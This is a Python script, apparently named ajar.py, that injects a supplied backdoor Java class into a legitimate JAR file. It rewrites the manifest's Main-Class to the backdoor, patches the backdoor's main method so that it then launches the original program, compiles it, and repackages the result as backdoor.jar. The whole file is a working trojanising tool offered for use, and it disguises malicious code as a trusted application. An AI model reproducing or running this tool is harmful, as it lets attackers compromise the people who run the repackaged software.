import zipfile, os, subprocess, shutil, sys, getopt, re

backdoor = target = None
outfile = "backdoor.jar"

def main(argv):
    global backdoor, target, outfile
    help = 0
    try:
        opts, args = getopt.getopt(argv, "b:t:o:", ["backdoor=", "target=", "outfile="])
    except getopt.GetoptError:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            help = 1
            print('USAGE:\tajar.py')
        elif opt in ("-b", "--backdoor"):
            backdoor = arg
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-o", "--outfile"):
            outfile = arg
            
    if (backdoor != None) & (target != None):
        try:
            start()
        except:
            print('[!] An error ocurred:\n')
            for e in sys.exc_info():
                print(e)
    elif help != 1:
        print('USAGE:\tajar.py -b <backdoor.java> -t <target.jar> [-o <outfile.jar>]')

def createZip(src, dst):
    zf = zipfile.ZipFile("%s" % (dst), "w")
    abs_src = os.path.abspath(src)
    for dirname, subdirs, files in os.walk(src):
        for filename in files:
            if filename != backdoor:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                #print('[*] jaring %s as %s' % (os.path.join(dirname, filename), arcname))
                zf.write(absname, arcname)
    zf.close()
        
def start():
    print("[*] Starting backdoor process")
    print("[*] Decompressing target to tmp directory...")
    #subprocess.call("jar -x %s" % target, shell=True)
    with zipfile.ZipFile(target, 'r') as zip:
        zip.extractall("tmp")
    print("[*] Target dumped to tmp directory")

    print("[*] Modifying manifest file...")
    oldmain=""
    man = open("tmp/META-INF/MANIFEST.MF","r").read()
    with open("tmp/META-INF/MANIFEST.MF","w") as f:
        for l in man.split("\n"):
            if "Main-Class" in l:
                oldmain=l[12:]
                f.write("Main-Class: %s\n" % "Backdoor")
            else:
                f.write("%s\n" % l)
    print("[*] Manifest file modified")
    
    print("[*] Modifying provided backdoor...")
    inmain=False
    level=0
    bd=open(backdoor, "r").read()
    with open("tmp/%s" % backdoor,'w') as f:
        for l in bd.split("\n"):
            if "main(" in l:
                inmain=True
                f.write(l)
            elif "}" in l and level<2 and inmain:
                f.write("%s.main(args);}" % oldmain)
                inmain=False
            elif "}" in l and level>1 and inmain:
                level-=1
                f.write(l)
            elif "{" in l and inmain:
                level+=1
                f.write(l)
            else:
                f.write(l)
    print("[*] Provided backdoor successfully modified")

    print("[*] Compiling modified backdoor...")
    if subprocess.call("javac -cp tmp/ tmp/%s" % backdoor, shell=True) != 0:
        print("[!] Error compiling %s" % backdoor)
    print("[*] Compiled modified backdoor")
                
    if(len(oldmain)<1):
        print("[!] Main-Class manifest attribute not found")
    else:
        print("[*] Repackaging target jar file...")
        createZip("tmp",outfile)
        print("[*] Target jar successfully repackaged")
    shutil.rmtree('tmp/')
    
if __name__ == "__main__":
    main(sys.argv[1:])
